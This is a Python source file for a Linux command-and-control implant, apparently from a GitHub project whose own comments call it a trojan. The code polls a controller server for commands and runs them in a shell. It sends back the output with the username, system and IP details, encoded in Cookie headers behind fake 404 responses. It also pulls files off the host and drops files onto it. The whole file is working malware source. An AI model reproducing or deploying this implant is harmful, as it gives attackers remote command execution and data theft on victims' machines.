#encoding=utf-8
#作者：@破壳雏鸟
#项目地址：https://github.com/pkcn445/C2/tree/main/PortableC2ForLinux_v0.1dev

from subprocess import Popen,PIPE
from socket import socket,AF_INET,SOCK_DGRAM
from getpass import getuser
from platform import platform
from time import sleep
from requests import post
from json import dumps,loads
from base64 import b64encode,b64decode
from os.path import basename,getsize,exists,isfile
#exec执行Python代码
key = ''
IP = "127.0.0.1"
PORT = 9000

class BaseFunc:
    def __init__(self) -> None:
        self.localuser = getuser() #获取当前用户名称
        self.sys_info = platform() #获取当前操作系统信息
        self.key_url = "http://"+IP+":"+str(PORT)+"/getkeys"
        self.pay_url = "http://"+IP+":"+str(PORT)+"/getpayloads"
        self.ret_url = "http://"+IP+":"+str(PORT)+"/addrst"

    def getbaseinfo(self) -> dict:
        """
        描述：
          该函数主要用来生成系统相关信息的
        调用：
          getbaseinfo()
        返回数据：
          {"localuser":当前用户名,"sys_info":系统信息,"local_ip":本地IP地址}
        """
        try:
            s = socket(AF_INET,SOCK_DGRAM)
            s.connect(('baidu.com',0))
            local_ip = s.getsockname()[0] #获取本地出网的IP地址
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":local_ip}
        except:
            rst = {"localuser":self.localuser,"sys_info":self.sys_info,"local_ip":None}
        finally:
            return rst

    def getkeys(self) -> str:
        """
        描述：
          该函数主要是用来向服务器获取唯一秘钥的，该秘钥是木马与服务器通信的认证
        调用：
          getkeys()
        返回数据：
          秘钥字符串
        """
        rst = post(url=self.key_url,timeout=5)
        if rst.status_code == 404 and rst.headers.get("Cookie"): #秘钥是存在于服务器响应头Cookie，下发成功则返回 404
            rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            return rst.get("key")
        else:
            return "error"
    
    def getpay(self,key:str):
        """
        描述：
          该函数主要是用来向服务器获取 payload 的
        调用：
          getpay(唯一秘钥)
        返回数据：
          {""}
        """
        head = {"Cookie":"cid="+key}
        rst = post(url=self.pay_url,headers=head,timeout=5)
        if rst.status_code == 404 and rst.headers.get("Cookie"):
            rst = loads(b64decode(rst.headers.get("Cookie")).decode("utf-8"))
            return rst.get("data")
        if rst.status_code == 500:
            return "exit"
        else:
            return ""

    def exc(self,cdm:str):
        """
        描述：
          该方法是用来执行系统命令的
        调用：
          exc(要执行命令字符串)
        返回数据：
          {"localuser":当前用户名,"sys_info":系统信息,"local_ip":本地IP地址,"cdm":执行的命令,"data":"b'命令执行结果base64加密后的字符串'"}
        """
        rst = self.getbaseinfo()
        if isinstance(cdm,str) and cdm != '':
            if cdm == "getlive":
                rst['cdm'] = "getlive"
                rst['data'] = ''
            else:
                r = Popen(cdm,shell=True,stderr=PIPE,stdout=PIPE)
                r = r.stdout.read()
                if r:
                    pass
                else:
                    r = "命令执行失败！".encode("utf-8")
                rst['cdm'] = cdm
                rst['data'] = str(b64encode(r)) #注意因为要强制转化为字符串原因，所以这里的结果为 "b'base64密文'""，在服务器端有相应的正则表达式处理
            return rst
        else:
            return None
    def downfile(self):
        """
        描述：
          该方法主要提供文件下载功能，对于客户端来说就是文件上传功能
        调用：
          downfile()
        返回数据：
          暂时为空
        """
        s = socket()
        s.connect((IP,60000))
        s.send("t".encode("utf-8")) #发送身份标识 t 表示文件接收方 c 表示文件上传方
        filename = ''
        filesize = ''
        filewritedir = ''
        data = s.recv(1024) #等待接收文件校验信息，确认两方都已经上线
        if data:
            try:
                data = data.decode("utf-8") #对数据进行解码
            except:
                pass
            else:
                data = data.split("'")[1] #处理 b'base64密文' ==》 ["b","数据base64密文"]
                data = loads(b64decode(data).decode("utf-8")) #将base64密文解密后再进行json反序列化得到 {"filename":"文件名称","filesize":int,"filewritedir":"目标路径"}
                filename = data.get("filename")
                filesize = data.get("filesize")
                filewritedir = data.get("filewritedir")
                #判断目标文件夹是否存在
                if exists(filewritedir) and not isfile(filewritedir):
                    pass
                else:
                    filewritedir = "/tmp/" #不存在则设定一个默认的
                with open(filewritedir+filename,"wb") as fp:
                    #接收第一段数据
                        if isinstance(data,str):
                            data = data.encode("utf-8")
                            filesize -= len(data)
                            fp.write(data)
                    #循环接收剩下的数据
                        while filesize >0:
                            data = s.recv(1024)
                            if data:
                                filesize -= len(data)
                                fp.write(data)
                                if filesize == 0:
                                    fp.flush()
                                    s.send(dumps({"whoami":"t","data":"exit"}).encode("utf-8")) #向文件发送方发送退出信息
        s.send(dumps({"whoami":"exit"}).encode("utf-8")) #向服务器发送退出信息
        s.close() #关闭套接字

    def uploadfile(self,filepath,targetfilepath=''):
        s = socket()
        s.connect((IP,60000))
        s.send("c".encode("utf-8")) #发送身份标识
        switch = True
        #判断要上传的文件是否存在
        if exists(filepath) and isfile(filepath):
            filename = basename(filepath)
            filesize = getsize(filepath)
        else:
            #不存在则设定特殊头文件来告诉其要退出
            filename = "nofile"
            filesize = -1

        #接收服务器的确认信息
        while True:
            data = s.recv(1024)
            if data:
                isok = loads(data.decode("utf-8"))
                break
        if isinstance(isok,dict) and isok.get("info") == "yes":
            while switch:
                filehead = {"filename":filename,"filesize":filesize,"filewritedir":targetfilepath}
                data = {"whoami":"c","data":str(b64encode(dumps(filehead).encode("utf-8")))}
                if data.get("data") == "exit":
                    #发送文件头部信息
                    s.send(dumps(data).encode("utf-8"))
                    break
                s.send(dumps(data).encode("utf-8"))
                if filename == "nofile" and filesize == -1:
                    break
                sleep(1)
                #发送开始发送文件数据确认信息
                data = {"whoami":"c","data":"senddata"}
                s.send(dumps(data).encode("utf-8"))
                #循环发送文件数据
                with open(filepath,"rb") as fp:
                    while filesize >0:
                        content = fp.read(1024)
                        filesize -= len(content)
                        s.sendall(content)
                        if filesize == 0:
                            switch = False
                            break        
        s.close() #关闭套接字

def main():
    base = BaseFunc() #实例化基础类

    key = base.getkeys() #获取秘钥

    print("获取秘钥：{}".format(key))

    time = 10 #设定默认睡眠时间，单位为：秒

    #进入循环
    while True:
        if key:
            try:
                rst = base.getpay(key) #获取payload
                print("获取payload：{}".format(rst))
                
                if rst == "exit": #判断是否要退出
                    break
                if isinstance(rst,dict) and isinstance(rst.get("cdm"),str): #判断是否为字典
                    if rst.get("sleeptime"):
                        time = float(rst.get("sleeptime"))
                        #做个判断防止非法的睡眠时间
                        if time < 0:
                            time = 20
                    c = rst.get("cdm") #获取要执行的命令
                    if c == "exit_yes": #如果命令为退出则停止运行
                        break
                    elif c == "uploadfile": #客户端要上传文件
                        base.downfile() #调用下载方法来下载客户端上传的文件
                        rst = "执行完毕！"
                    elif c.split(' ')[0].strip() == "downfile": #客户端要下载文件 "downfile 文件路径"，对其进行切割空格得到 ["downfile","要下载的文件路径"]
                        base.uploadfile(c.split(' ')[1].strip())
                        rst = "执行完毕！"
                    else:
                        rst = base.exc(c) #执行命令
                    if isinstance(rst,dict):
                        head = {"Cookie":"cid="+key}
                        data = {"data":str(b64encode(dumps(rst).encode("utf-8")))}
                        print("返回结果：{}".format(data))
                        rst = post(url=base.ret_url,headers=head,data=data,timeout=5) #返回执行结果
            except:
                pass
            sleep(time) #程序睡眠
        else:
            break

if __name__ == "__main__":
    main()




